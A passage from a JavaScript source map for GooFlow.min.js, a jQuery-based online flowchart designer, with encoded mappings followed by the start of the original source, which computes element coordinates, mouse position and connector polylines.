IqD,EAAIpV,GAAG,KAAI+R,EAAIqD,EAAIpV,GAAG,IAC7BxC,KAAK2F,SAAS+C,GAAGb,WAAW,GAAGqE,MAAMzL,MAAQmX,EAAInV,GAAG,GAAGmV,EAAIpV,GAAG,IAAI,EAAE+R,EAAIvU,KAAK2F,SAAS+C,GAAGb,WAAW,GAAG2M,YAAY,EAAE,GACrHD,EAAKqD,EAAIlV,MAAM,GAAGkV,EAAIjV,IAAI,GAAIiV,EAAIjV,IAAI,GAAGiV,EAAIlV,MAAM,IAC5CkV,EAAInV,GAAG,KAAI8R,EAAIqD,EAAInV,GAAG,IAC1B8R,EAAIqD,EAAIpV,GAAG,KAAI+R,EAAIqD,EAAIpV,GAAG,IAC7BxC,KAAK2F,SAAS+C,GAAGb,WAAW,GAAGqE,MAAM1L,KAAOoX,EAAInV,GAAG,GAAGmV,EAAIpV,GAAG,IAAI,EAAE+R,EAAIvU,KAAK2F,SAAS+C,GAAGb,WAAW,GAAGgQ,aAAa,EAAE,OAErH7X,KAAK2F,SAAS+C,GAAGb,WAAW,GAAGqE,MAAMzL,OAClCmX,EAAIjV,IAAI,GAAGiV,EAAIlV,MAAM,KAAKkV,EAAIjV,IAAI,GAAGiV,EAAIlV,MAAM,GAAI,GAAG,GAAG1C,KAAK2F,SAAS+C,GAAGb,WAAW,GAAG2M,aAAa,EAAE,OAEvGxU,KAAK2F,SAAS+C,GAAGb,WAAW,GAAGkF,YAAY/M,KAAKqF,UAAUqD,GAAGe,OAIpE8H,YAAY,SAASlG,EAAG0M,EAAQjW,GAC/B,IAAIiW,GAAkB,MAATA,GAAyB,KAAVA,GAAcA,IAAU/X,KAAKqF,UAAUgG,GAAIxJ,KAAM,OAAO,EACpF,GAA+B,mBAArB7B,KAAK+K,gBAA+D,IAAjC/K,KAAK+K,cAAcM,EAAG0M,GAAnE,CACA,GAAG/X,KAAKwR,WAAW,CAClB,IAAIM,GAAOzG,EAAGrL,KAAKqF,UAAUgG,GAAIxJ,KAAK7B,KAAKqF,UAAUgG,GAAIvJ,GACzD9B,KAAK4R,SAAS,cAAcE,GAE7B,IAGI8F,EAHA/K,EAAK7M,KAAKqF,UAAUgG,GAAIwB,KACxBC,EAAG9M,KAAKqF,UAAUgG,GAAIyB,GAI1B,GAAa,QAHb9M,KAAKqF,UAAUgG,GAAIxJ,KAAKkW,GAKpBjW,EACF9B,KAAKqR,SAAShG,EAAGvJ,GAAE,GAEnB9B,KAAKqR,SAAShG,EAAG5H,UAAUzD,KAAKuF,UAAUsH,GAAM7M,KAAKuF,UAAUuH,GAAIiL,IAAS,OAI1E,CAIH,UAHO/X,KAAKqF,UAAUgG,GAAIvJ,EAC1B9B,KAAKkR,UAAUvD,OAAOD,WAAW,QAAQA,WAAW,SACpDkK,EAAIhV,aAAa5C,KAAKuF,UAAUsH,GAAM7M,KAAKuF,UAAUuH,GAAK9M,KAAKoG,SACtD,OACTpG,KAAK+J,MAAMkH,YAAYjR,KAAK2F,SAAS0F,IACrCrL,KAAK2F,SAAS0F,GAAIxL,QAAQqE,UAAUmL,SAAShE,EAAGuM,EAAIlV,MAAMkV,EAAIjV,IAAI3C,KAAKqF,UAAUgG,GAAIuE,OAAO5P,KAAKqF,UAAUgG,GAAIoE,KAAMzP,KAAKoG,QAC1HpG,KAAK+J,MAAM2B,YAAY1L,KAAK2F,SAAS0F,IACP,KAA3BxL,QAAQqE,UAAUC,QACpBnE,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAGoF,UAAUjN,KAAKqF,UAAUgG,GAAI5B,KAC7DzJ,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAGqE,MAAMzL,OACnCmX,EAAIjV,IAAI,GAAGiV,EAAIlV,MAAM,KAAKkV,EAAIjV,IAAI,GAAGiV,EAAIlV,MAAM,GAAI,GAAG,GAAG1C,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAG2M,aAAa,EAAE,GAG3GxU,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAGkF,YAAY/M,KAAKqF,UAAUgG,GAAI5B,KAE9DzJ,KAAKgG,SAASqF,GAChBrL,KAAK6J,UAAUwB,GAEbrL,KAAKiG,YACPjG,KAAKqF,UAAUgG,GAAI6I,KAAI,KAIzB7C,SAAS,SAAShG,EAAGvJ,EAAEkW,GACtB,IAAIhY,KAAKqF,UAAUgG,IAAKvJ,EAAE,IAAI9B,KAAKqF,UAAUgG,GAAIxJ,MAAgC,OAA1B7B,KAAKqF,UAAUgG,GAAIxJ,KAAa,OAAO,EAC9F,GAA4B,mBAAlB7B,KAAK8K,aAAmD,IAAxB9K,KAAK8K,WAAWO,EAAGvJ,GAAY,OAAO,EAChF,GAAG9B,KAAKwR,aAAawG,EAAQ,CAC5B,IAAIlG,GAAOzG,EAAGrL,KAAKqF,UAAUgG,GAAIvJ,GACjC9B,KAAK4R,SAAS,WAAWE,GAE1B,IAAIjF,EAAK7M,KAAKqF,UAAUgG,GAAIwB,KACxBC,EAAG9M,KAAKqF,UAAUgG,GAAIyB,GAC1B9M,KAAKqF,UAAUgG,GAAIvJ,EAAEA,EACrB,IAAI8O,EAAGlP,eAAe1B,KAAKuF,UAAUsH,GAAM7M,KAAKuF,UAAUuH,GAAI9M,KAAKqF,UAAUgG,GAAIxJ,KAAK7B,KAAKqF,UAAUgG,GAAIvJ,EAAG9B,KAAKoG,QAIjH,GAHApG,KAAK+J,MAAMkH,YAAYjR,KAAK2F,SAAS0F,IACrCrL,KAAK2F,SAAS0F,GAAIxL,QAAQqE,UAAUoT,SAASjM,EAAGuF,EAAGlO,MAAMkO,EAAGpO,GAAGoO,EAAGnO,GAAGmO,EAAGjO,IAAI3C,KAAKqF,UAAUgG,GAAIuE,OAAO5P,KAAKqF,UAAUgG,GAAIoE,KAAMzP,KAAKoG,QACpIpG,KAAK+J,MAAM2B,YAAY1L,KAAK2F,SAAS0F,IACP,KAA3BxL,QAAQqE,UAAUC,OAAY,CAChCnE,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAGoF,UAAUjN,KAAKqF,UAAUgG,GAAI5B,KAC7D,IAAI8K,EAAK3D,EAAGlO,MAAM,GAAGkO,EAAGjO,IAAI,GAAIiO,EAAGjO,IAAI,GAAGiO,EAAGlO,MAAM,GAChD6R,EAAI3D,EAAGnO,GAAG,KAAI8R,EAAI3D,EAAGnO,GAAG,IACxB8R,EAAI3D,EAAGpO,GAAG,KAAI+R,EAAI3D,EAAGpO,GAAG,IAC3BxC,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAGqE,MAAMzL,MAAQmQ,EAAGnO,GAAG,GAAGmO,EAAGpO,GAAG,IAAI,EAAE+R,EAAIvU,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAG2M,YAAY,EAAE,GACrHD,EAAK3D,EAAGlO,MAAM,GAAGkO,EAAGjO,IAAI,GAAIiO,EAAGjO,IAAI,GAAGiO,EAAGlO,MAAM,IACxCkO,EAAGnO,GAAG,KAAI8R,EAAI3D,EAAGnO,GAAG,IACxB8R,EAAI3D,EAAGpO,GAAG,KAAI+R,EAAI3D,EAAGpO,GAAG,IAC3BxC,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAGqE,MAAM1L,KAAOoQ,EAAGnO,GAAG,GAAGmO,EAAGpO,GAAG,IAAI,EAAE+R,EAAIvU,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAGgQ,aAAa,EAAE,OAEjH7X,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAGkF,YAAY/M,KAAKqF,UAAUgG,GAAI5B,KACjEzJ,KAAKiG,YACPjG,KAAKqF,UAAUgG,GAAI6I,KAAI,IAIzB5C,QAAQ,SAASjG,EAAGoJ,GACnB,GAAIzU,KAAKqF,UAAUgG,MAChB,IAAQoJ,GAAmC,mBAAjBzU,KAAK0K,YAAsD,IAA5B1K,KAAK0K,UAAUW,EAAG,SAA9E,CACA,GAAGrL,KAAKwR,WAAW,CAClB,IAAIM,GAAOzG,EAAGrL,KAAKqF,UAAUgG,IAC7BrL,KAAK4R,SAAS,UAAUE,GAEzB9R,KAAK+J,MAAMkH,YAAYjR,KAAK2F,SAAS0F,WAC9BrL,KAAKqF,UAAUgG,UACfrL,KAAK2F,SAAS0F,GAClBrL,KAAKgG,SAASqF,IAAIrL,KAAKgG,OAAO,MAC/BhG,KAAKsF,WACJtF,KAAKiG,YAGPjG,KAAKkG,aAAamF,GAAI,OACtBrL,KAAK2Q,QAAQhD,OAAOD,WAAW,KAC/B1N,KAAKsP,MAAM3B,OAAOD,WAAW,MAE3B1N,KAAK4J,WACP5J,KAAK4J,UAAU+D,OAAOD,WAAW,SAKnCiC,eAAe,SAASsI,EAAQC,EAAUC,EAAQH,GACjD,GAAGE,IAAWC,GACVF,GAASjY,KAAKqF,UAAU4S,GAA5B,CAOA,IAAI,IAAIjF,KANK,MAAVkF,GAA2B,KAAXA,IAClBA,EAASlY,KAAKqF,UAAU4S,GAAQpL,MACtB,MAARsL,GAAuB,KAATA,IAChBA,EAAOnY,KAAKqF,UAAU4S,GAAQnL,IAGlB9M,KAAKqF,UACjB,GAAI6S,IAAWlY,KAAKqF,UAAU2N,GAAGnG,MAAMsL,IAASnY,KAAKqF,UAAU2N,GAAGlG,GACjE,OAEF,GAAiC,mBAAvB9M,KAAKgL,kBAA+E,IAA/ChL,KAAKgL,gBAAgBiN,EAAOC,EAASC,GAApF,CACA,GAAGnY,KAAKwR,aAAawG,EAAQ,CAC5B,IAAIlG,GAAOmG,EAAOjY,KAAKqF,UAAU4S,GAAQpL,KAAK7M,KAAKqF,UAAU4S,GAAQnL,IACrE9M,KAAK4R,SAAS,iBAAiBE,GAEnB,MAAVoG,GAA2B,KAAXA,IAClBlY,KAAKqF,UAAU4S,GAAQpL,KAAKqL,GAElB,MAARC,GAAuB,KAATA,IAChBnY,KAAKqF,UAAU4S,GAAQnL,GAAGqL,GAG3BnY,KAAK+J,MAAMkH,YAAYjR,KAAK2F,SAASsS,IACrCjY,KAAK0X,WAAWO,EAAOjY,KAAKqF,UAAU4S,IACnCjY,KAAKiG,YACPjG,KAAKqF,UAAU4S,GAAQ/D,KAAI,MAM7BkE,SAAS,SAAS/M,EAAGxJ,EAAKiK,GACzB,GAAU,SAAPjK,EAAc,CAChB,IAAI7B,KAAKuF,UAAU8F,GAAK,OACxB,GAA4B,mBAAlBrL,KAAKsK,aAA6D,IAAlCtK,KAAKsK,WAAWe,EAAG,OAAOS,GAAe,OACnF9L,KAAKuF,UAAU8F,GAAIuE,OAAO9D,IAAM,EAC7BA,EACF9L,KAAK4F,SAASyF,GAAIhH,SAAS,aAAaQ,IAAI,eAAehF,QAAQ+E,MAAMkH,OAGzE9L,KAAK4F,SAASyF,GAAIuD,YAAY,aAC3BvD,IAAKrL,KAAKgG,QAAQhG,KAAK4F,SAASyF,GAAIxG,IAAI,eAAe,qBAGtD,GAAU,SAAPhD,EAAc,CACtB,IAAI7B,KAAKqF,UAAUgG,GAAK,OACxB,GAAoB,MAAjBrL,KAAKsK,aAAmBtK,KAAKsK,WAAWe,EAAG,OAAOS,GAAO,OAC5D9L,KAAKqF,UAAUgG,GAAIuE,OAAO9D,IAAM,EACF,KAA3BjM,QAAQqE,UAAUC,OACjB2H,GACF9L,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAG2D,aAAa,SAAS3L,QAAQ+E,MAAMkH,MACpE9L,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAG2D,aAAa,aAAa,gBAC1DxL,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAG2D,aAAa,eAAe,OAE5DxL,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAG2D,aAAa,SAAS3L,QAAQ+E,MAAMiH,MACpE7L,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAG2D,aAAa,aAAa,gBAC1DxL,KAAK2F,SAAS0F,GAAIxD,WAAW,GAAG2D,aAAa,eAAe,MAG1DM,GACF9L,KAAK2F,SAAS0F,GAAI+H,YAAYvT,QAAQ+E,MAAMkH,KAC5C9L,KAAK2F,SAAS0F,GAAI4L,aAAa,QAG/BjX,KAAK2F,SAAS0F,GAAI+H,YAAYvT,QAAQ+E,MAAMiH,KAC5C7L,KAAK2F,SAAS0F,GAAI4L,aAAa,OAIlC,GAAGjX,KAAKwR,WAAW,CAClB,IAAIM,GAAOzG,EAAGxJ,GAAMiK,GACpB9L,KAAK4R,SAAS,WAAWE,KAK3BuG,cAAc,SAAS1E,GACtB,IAAID,EAAK1T,KAAKyF,UAAUkO,GACxB,IAAI,IAAIV,KAAOjT,KAAKuF,UAAU,CAC7B,IAAI6J,EAAOpP,KAAKuF,UAAU0N,GACtB7D,EAAK3O,MAAMiT,EAAKjT,MAAM2O,EAAK3O,KAAKiT,EAAKjT,KAAKiT,EAAKzR,OAClDmN,EAAK5O,KAAKkT,EAAKlT,KAAK4O,EAAK5O,IAAIkT,EAAKlT,IAAIkT,EAAKxR,OAE3CkN,EAAKuE,OAAOA,EACJvE,EAAKuE,QAAUvE,EAAKuE,SAASA,GACrC3T,KAAKuT,WAAWN,KAInB3E,SAAS,SAASjD,EAAG5K,EAAKD,GACzB,GAAIR,KAAKyF,UAAU4F,KACC,MAAjBrL,KAAK2K,YAAmB3K,KAAK2K,WAAWU,EAAG,OAAO5K,EAAKD,IAA1D,CACA,GAAGR,KAAKwR,WAAW,CAClB,IAAIM,GAAOzG,EAAGrL,KAAKyF,UAAU4F,GAAI5K,KAAKT,KAAKyF,UAAU4F,GAAI7K,KACzDR,KAAK4R,SAAS,WAAWE,GAEvBrR,EAAK,IAAGA,EAAK,GACbD,EAAI,IAAGA,EAAI,GACdV,EAAE,IAAIuL,GAAIxG,KAAKpE,KAAKA,EAAKT,KAAKoG,OAAO,KAAK5F,IAAIA,EAAIR,KAAKoG,OAAO,OAC9DpG,KAAKyF,UAAU4F,GAAI5K,KAAKA,EACxBT,KAAKyF,UAAU4F,GAAI7K,IAAIA,EACpBR,KAAKiG,YACPjG,KAAKyF,UAAU4F,GAAI6I,KAAI,EACvBlU,KAAKqY,cAAchN,MAIrBoD,QAAQ,SAASpD,EAAIoJ,GACpB,GAAIzU,KAAKyF,UAAU4F,GAAnB,CACA,GAAGrL,KAAKwR,WAAW,CAClB,IAAIM,GAAOzG,EAAGrL,KAAKyF,UAAU4F,IAC7BrL,KAAK4R,SAAS,UAAUE,GAEzB,KAAG,IAAQ2C,GAAmC,mBAAjBzU,KAAK0K,YAAsD,IAA5B1K,KAAK0K,UAAUW,EAAG,kBACvErL,KAAKyF,UAAU4F,GACtBrL,KAAK6F,SAASwF,GAAIqJ,gBACX1U,KAAK6F,SAASwF,KACnBrL,KAAK0F,WACJ1F,KAAKiG,WAAU,CAGjB,IAAI,IAAIgN,KAAOjT,KAAKuF,UAAU,CAC7B,IAAI6J,EAAOpP,KAAKuF,UAAU0N,GACvB7D,EAAKuE,SAAStI,UACT+D,EAAKuE,OAGd3T,KAAKkG,aAAamF,GAAI,UAIxBqD,aAAa,SAASrD,EAAGzG,GACxB,GAAI5E,KAAKyF,UAAU4F,GAAnB,CACA,GAAGrL,KAAKwR,WAAW,CAClB,IAAIM,GAAOzG,EAAGrL,KAAKyF,UAAU4F,GAAIzG,OACjC5E,KAAK4R,SAAS,eAAeE,GAEnB,QAARlN,GAAuB,WAARA,GAA0B,SAARA,GAAwB,UAARA,IACnD5E,KAAK6F,SAASwF,GAAIuD,YAAY,QAAQ5O,KAAKyF,UAAU4F,GAAIzG,OAAOP,SAAS,QAAQO,GACjF5E,KAAKyF,UAAU4F,GAAIzG,MAAMA,GAEvB5E,KAAKiG,YACPjG,KAAKyF,UAAU4F,GAAI6I,KAAI,KAIzB/F,WAAW,SAAS9C,EAAGpJ,EAAMC,GAC5B,GAAIlC,KAAKyF,UAAU4F,KACW,mBAApBrL,KAAK6K,eAAyE,IAA5C7K,KAAK6K,aAAaQ,EAAG,OAAOpJ,EAAMC,IAA9E,CACA,GAAGlC,KAAKwR,WAAW,CAClB,IAAIM,GAAOzG,EAAGrL,KAAKyF,UAAU4F,GAAIpJ,MAAMjC,KAAKyF,UAAU4F,GAAInJ,QAC1DlC,KAAK4R,SAAS,aAAaE,GAG5B9R,KAAK6F,SAASwF,GAAIhC,SAAS,OAAOxE,KAAK5C,MAAMA,EAAMjC,KAAKoG,OAAO,KAAKlE,OAAOA,EAAOlC,KAAKoG,OAAO,OAE9FnE,EAAMjC,KAAK6F,SAASwF,GAAI+C,aACxBlM,EAAOlC,KAAK6F,SAASwF,GAAIgD,cACzBrO,KAAK6F,SAASwF,GAAIhC,SAAS,MAAMxE,KAAK5C,MAAMA,EAAM,KAAKC,OAAOA,EAAO,OAErElC,KAAKyF,UAAU4F,GAAIpJ,MAAMA,EACzBjC,KAAKyF,UAAU4F,GAAInJ,OAAOA,EACvBlC,KAAKiG,YACPjG,KAAKyF,UAAU4F,GAAI6I,KAAI,EACvBlU,KAAKqY,cAAchN,MAGrBsD,QAAQ,SAAStD,EAAGuI,GACQ,mBAAjB5T,KAAKyK,YAA2D,IAAjCzK,KAAKyK,UAAUY,EAAG,OAAOuI,KAC/D5T,KAAKwR,YAAYxR,KAAKiG,WACxBjG,KAAK4R,SAAS,WAAWvG,IAE1BrL,KAAK6F,SAASwF,GAAIvL,EAAE,YAAYuL,EAAG,8BAA8BuI,EAAKhP,MACpE,gBAAgBgP,EAAKpT,IAAIR,KAAKoG,OAAO,WAAWwN,EAAKnT,KAAKT,KAAKoG,OAAO,oCAAqCwN,EAAK3R,MAAMjC,KAAKoG,OAAQ,aAAcwN,EAAK1R,OAAOlC,KAAKoG,OAAQ,oBAChKwN,EAAKnK,KAAK,kJACtBzJ,KAAKyF,UAAU4F,GAAIuI,EACnB5T,KAAKiK,OAAOjF,OAAOhF,KAAK6F,SAASwF,IACd,UAAhBrL,KAAKoF,UAAoBpF,KAAK6F,SAASwF,GAAIhC,SAAS,aAAaxE,IAAI,UAAU,UAChF7E,KAAK0F,WACJ1F,KAAKiG,YACPjG,KAAKyF,UAAU4F,GAAI6I,KAAI,EACvBlU,KAAKqY,cAAchN,GAChBrL,KAAKkG,aAAamF,WAAYrL,KAAKkG,aAAamF,MAIrDiN,WAAW,SAASrW,EAAMC,GACzB,IAAImO,EAAGpO,GAAOjC,KAAKoE,OAAOnC,QACtBqO,EAAGpO,GAAQlC,KAAKoE,OAAOlC,SAC3BlC,KAAKoE,OAAOS,KAAK3C,OAAOoO,EAAE,KAAKrO,MAAMoO,EAAE,OACvC,IAAIhK,EAAW,EAAEkS,EAAK,EACP,MAAZvY,KAAKkF,QACPmB,EAAW,GACXkS,EAAK,GAES,MAAZvY,KAAKiF,QACPjF,KAAKiF,MAAMJ,KAAK3C,OAAOoO,EAAEjK,EAAWkS,EAAK,OACzClI,GAAG,IAEJA,GAAG,EACHC,EAAEA,EAAEjK,GAAwB,MAAZrG,KAAKkF,MAAa,EAAE,GAGjClF,KAAKiJ,UAAUhH,QAAQoO,IACzBA,EAAErQ,KAAKiJ,UAAUhH,SAEfjC,KAAKiJ,UAAU/G,SAASoO,IAC1BA,EAAEtQ,KAAKiJ,UAAU/G,UAGlBlC,KAAKiJ,UAAUpE,KAAK3C,OAAOoO,EAAE,KAAKrO,MAAMoO,EAAE,OACZ,KAA3BxQ,QAAQqE,UAAUC,SACpBnE,KAAK+J,MAAMiC,UAAYqE,EAAE,IAAIC,GAE9BtQ,KAAK+J,MAAMmC,MAAMjK,MAAQoO,EAAI,KAC7BrQ,KAAK+J,MAAMmC,MAAMhK,OAASoO,EAAI,KACd,MAAbtQ,KAAKiK,QACPjK,KAAKiK,OAAOpF,KAAK3C,OAAOoO,EAAE,KAAKrO,MAAMoO,EAAE,QAIzCmI,WAAW,SAASzW,GAKnB,GAJIA,EACIA,EAAM,GAAKA,EAAM,GACX,EAANA,IAASA,EAAM,GAFZA,EAAM,EAId/B,KAAKoG,SAASrE,EAAjB,CACA,IAEI0W,EAFKzY,KAAKoG,QACdpG,KAAKoG,OAAOrE,GAER2W,EAAE,EAAEC,EAAE,EAAEC,KAEZ5Y,KAAK8J,WAEL4O,EAAE1Y,KAAKiJ,UAAUhH,QAAQwW,EACzBE,EAAE3Y,KAAKiJ,UAAU/G,SAASuW,EAC1BzY,KAAKiJ,UAAUpE,KAAK3C,OAASyW,EAAE,KAAK1W,MAAQyW,EAAE,OAChB,KAA3B7Y,QAAQqE,UAAUC,SAGpBnE,KAAK+J,MAAMiC,UAAY0M,EAAE,IAAIC,GAE9B3Y,KAAK+J,MAAMmC,MAAMjK,MAAQyW,EAAI,KAC7B1Y,KAAK+J,MAAMmC,MAAMhK,OAASyW,EAAI,KACd,MAAb3Y,KAAKiK,QACPjK,KAAKiK,OAAOpF,KAAK3C,OAAOyW,EAAE,KAAK1W,MAAMyW,EAAE,OAGxC,IAAIG,GAAkE,EAAvD9U,UAAUC,UAAUiQ,cAAchQ,QAAQ,UACzDjE,KAAKiJ,UAAUI,SAAS,iBAAiBuJ,KAAK,WAC7C,IAAI9K,EAAKhI,EAAEE,MACX4Y,EAAE9Q,EAAKsJ,WACPtJ,EAAKjD,KAAMpE,KAAOmY,EAAEnY,KAAKgY,EAAO,KAAMjY,IAAMoY,EAAEpY,IAAIiY,EAAO,OACzD3Q,EAAKA,EAAKuB,SAAS,SACnBqP,EAAE5Q,EAAKsG,aAAaqK,EACpBE,EAAE7Q,EAAKuG,cAAcoK,EACrB3Q,EAAKjD,KAAM5C,MAAQyW,EAAE,KAAMxW,OAASyW,EAAE,OACtC,IAAIrS,EAAI,GAAGvE,EACX+F,EAAKhB,KAAK,mBAAmBjC,KAAK5C,MAAMqE,EAAI,OAC5C,IAAIwS,KAeJ,GAdGxS,EAAI,IAAIuS,GACVC,EAAe,MAAE,OAAOA,EAAgB,OAAE,OAC1CA,EAAQ,aAAa,OACrBA,EAAmB,UAAE,SAAUxS,EAAI,GAAI,IACvCwS,EAAgB,SAAK,GAAGxS,GAAK,EAAG,OAEhCwS,EAAe,MAAExS,EAAI,KAAMwS,EAAgB,OAAExS,EAAI,KACjDwS,EAAQ,aAAaxS,EAAI,KACzBwS,EAAmB,UAAE,OACrBA,EAAgB,OAAE,YAEnBhR,EAAKhB,KAAK,mBAAmBuC,SAAS,KAAKxE,IAAIiU,GAE/CxS,EAAI,GAAGvE,EACiC,IAArC+F,EAAKf,SAASD,KAAK,SAASH,OAC9BmB,EAAKf,SAASlC,IAAI,gBAAgB6T,EAAE,EAAE,OACtC5Q,EAAKA,EAAKf,SAASD,KAAK,UACnBjC,KAAKkU,YAAYzS,EAAI,WACtB,CAGJ,GAFAwB,EAAKA,EAAKhB,KAAK,gBACfgS,KACGxS,EAAI,IAAIuS,EAAS,CACnBC,EAAQ,aAAa,OACrBA,EAAmB,UAAE,SAAUxS,EAAI,GAAI,IACvC,IAAI0S,GAAIN,EAAE3W,EAAM,IAAI2W,EAAE,GAAG3W,IAAQ,EAC7BkX,GAAIN,EAAE5W,EAAM4W,GAAG,EACnBG,EAAgB,QAAGG,EAAG,OAAQD,EAAI,UAElCF,EAAmB,UAAE,OACrBA,EAAQ,aAAaxS,EAAI,KACzBwS,EAAgB,OAAE,MAEnBhR,EAAKjD,IAAIiU,MAIX,IAAII,EAAI,GAAGnX,EAAM,EAoBjB,IAAI,IAAIsJ,KAnBRrL,KAAKiK,OAAOZ,SAAS,iBAAiBuJ,KAAK,WAC1C,IAAI9K,EAAKhI,EAAEE,MACX4Y,EAAE9Q,EAAKsJ,WACPtJ,EAAKjD,KAAMpE,KAAOmY,EAAEnY,KAAKgY,EAAO,KAAMjY,IAAMoY,EAAEpY,IAAIiY,EAAO,OACzD3Q,EAAKA,EAAKuB,SAAS,aACnBqP,EAAE5Q,EAAKsG,aAAaqK,EACpBE,EAAE7Q,EAAKuG,cAAcoK,EACrB3Q,EAAKjD,KAAM5C,MAAQyW,EAAE,KAAMxW,OAASyW,EAAE,OACtC7Q,EAAKqR,KAAK,SAAStU,KAClBkU,YAAa,GAAGhX,EAAM,KACtBtB,KAAQyY,EAAI,EAAE,OACZC,KAAK,KAAKtU,KACZkU,YAAaG,EAAI,EAAE,KACnBjX,MAAMiX,EAAI,KACVhX,OAAOgX,EAAI,KACXE,cAAcF,EAAI,SAINlZ,KAAK2F,SAClB3F,KAAK+J,MAAMkH,YAAYjR,KAAK2F,SAAS0F,WAC9BrL,KAAK2F,SAAS0F,GAEtB,IAAK,IAAI4H,KAAOjT,KAAKqF,UACpBrF,KAAK0X,WAAWzE,EAAKjT,KAAKqF,UAAU4N,OAKvCpT,QAAQ+E,OAEPE,KAAK,UACLsK,KAAK,UACLvD,KAAK,UACLkL,SAAS,OACTjL,KAAK,UACL+H,IAAI,UACJE,QAAQ,QAGTlU,QAAQgH,SACPH,YACA4B,YACA4H,iBAAYmJ,EACZjJ,kBAAaiJ,GAGdxZ,QAAQyZ,KAAK,SAAS3V,EAASC,GAC9B,OAAO,IAAI/D,QAAQ8D,EAASC,IAG7B/D,QAAQ0Z,UAAU,SAAS7U,GAC1B5E,EAAE6E,OAAO9E,QAAQ+E,MAAMF,IAGxB7E,QAAQ8E,OAAO,SAASiP,GACvB,IAAI,IAAI/B,KAAY+B,EACnB/T,QAAQqE,UAAU2N,GAAU+B,EAAK/B,IAInC/R,EAAE6E,QACD6U,cAAc,SAAS7V,EAASC,GAC/B,OAAO,IAAI/D,QAAQ8D,EAASC,MAGvB/D","file":"../GooFlow.min.js","sourcesContent":["/**\r\n * Gooflow在线流程图设计器\r\n * Version: 1.3.2\r\n * Copyright: foolegg126(sdlddr)\r\n */\r\n;(function ( global, factory ) {\r\n\t'use strict';\r\n\tif ( typeof define !== 'undefined' && define.amd ) {// export as AMD...\r\n\t\tdefine( [ 'jquery' ], factory );\r\n\t}else if ( typeof module !== 'undefined' && module.exports ) {// ...or as browserify\r\n\t\tmodule.exports = factory( require('jquery') );\r\n\t}else\r\n\t\tglobal.GooFlow = factory( global.$ );\r\n\r\n}( typeof window !== 'undefined' ? window : this, function ( $ ) {\r\n\t//预先定义几个公用方法\r\n\t//获取一个DIV的绝对坐标的功能函数,即使是非绝对定位,一样能获取到\r\n\tfunction _elCsys(dom) {\r\n\t\tvar t = dom.offsetTop;\r\n\t\tvar l = dom.offsetLeft;\r\n\t\tdom=dom.offsetParent;\r\n\t\twhile (dom) {\r\n\t\t\tt += dom.offsetTop;\r\n\t\t\tl += dom.offsetLeft;\r\n\t\t\tdom=dom.offsetParent;\r\n\t\t}\r\n\t\treturn { top: t, left: l };\r\n\t}\r\n\t//兼容各种浏览器的,获取鼠标真实位置\r\n\tfunction _mouseP(ev){\r\n\t\tif(!ev) ev=window.event;\r\n\t\tif(ev.pageX || ev.pageY){\r\n\t\t\treturn {x:ev.pageX, y:ev.pageY};\r\n\t\t}\r\n\t\treturn {\r\n\t\t\tx:ev.clientX + document.documentElement.scrollLeft - document.body.clientLeft,\r\n\t\t\ty:ev.clientY + document.documentElement.scrollTop  - document.body.clientTop\r\n\t\t};\r\n\t}\r\n\t//计算两个结点间要连折线的话，连线的所有坐标\r\n\tfunction calcPolyPoints(n1,n2,type,M,scale){\r\n\t\tif(!scale)\tscale=1.0;\r\n\t\tvar N1={left:n1.left*scale, top:n1.top*scale, width:n1.width*scale, height:n1.height*scale};\r\n\t\tvar N2={left:n2.left*scale, top:n2.top*scale, width:n2.width*scale, height:n2.height*scale};\r\n\t\tM=M*scale;\r\n\t\t//开始/结束两个结点的中心\r\n\t\tvar SP={x:N1.left+N1.width/2,y:N1.top+N1.height/2};\r\n\t\tvar EP={x:N2.left+N2.width/2,y:N2.top+N2.height/2};\r\n\t\tvar m1=[],m2=[],sp,ep;\r\n\t\t//如果是允许中段可左右移动的折线,则参数M为可移动中段线的X坐标\r\n\t\t//粗略计算起始点\r\n\t\tsp=[SP.x,SP.y];\r\n\t\tep=[EP.x,EP.y];\r\n\t\tif(type===\"lr\"){\r\n\t\t\t//粗略计算2个中点\r\n\t\t\tm1=[M,SP.y];\r\n\t\t\tm2=[M,EP.y];\r\n\t\t\t//再具体分析修改开始点和中点1\r\n\t\t\tif(m1[0]>N1.left&&m1[0]<N1.left+N1.width){\r\n\t\t\t\tm1[1]=(SP.y>EP.y? N1.top:N1.top+N1.height);\r\n\t\t\t\tsp[0]=m1[0];sp[1]=m1[1];\r\n\t\t\t}\r\n\t\t\telse{\r\n\t\t\t\tsp[0]=(m1[0]<N1.left? N1.left:N1.left+N1.width)\r\n\t\t\t}\r\n\t\t\t//再具体分析中点2和结束点\r\n\t\t\tif(m2[0]>N2.left&&m2[0]<N2.left+N2.width){\r\n\t\t\t\tm2[1]=(SP.y>EP.y? N2.top+N2.height:N2.top);\r\n\t\t\t\tep[0]=m2[0];ep[1]=m2[1];\r\n\t\t\t}\r\n\t\t\telse{\r\n\t\t\t\tep[0]=(m2[0]<N2.left? N2.left:N2.left+N2.width)\r\n\t\t\t}\r\n\t\t}\r\n\t\t//如果是允许中段可上下移动的折线,则参数M为可移动中段线的Y坐标\r\n\t\telse if(type===\"tb\"){\r\n\t\t\t//粗略计算2个中点\r\n\t\t\tm1=[SP.x,M];\r\n\t\t\tm2=[EP.x,M];\r\n\t\t\t//再具体分析修改开始点和中点1\r\n\t\t\tif(m1[1]>N1.top&&m1[1]<N1.top+N1.height){\r\n\t\t\t\tm1[0]=(SP.x>EP.x? N1.left:N1.left+N1.width);\r\n\t\t\t\tsp[0]=m1[0];sp[1]=m1[1];\r\n\t\t\t}\r\n\t\t\telse{\r\n\t\t\t\tsp[1]=(m1[1]<N1.top? 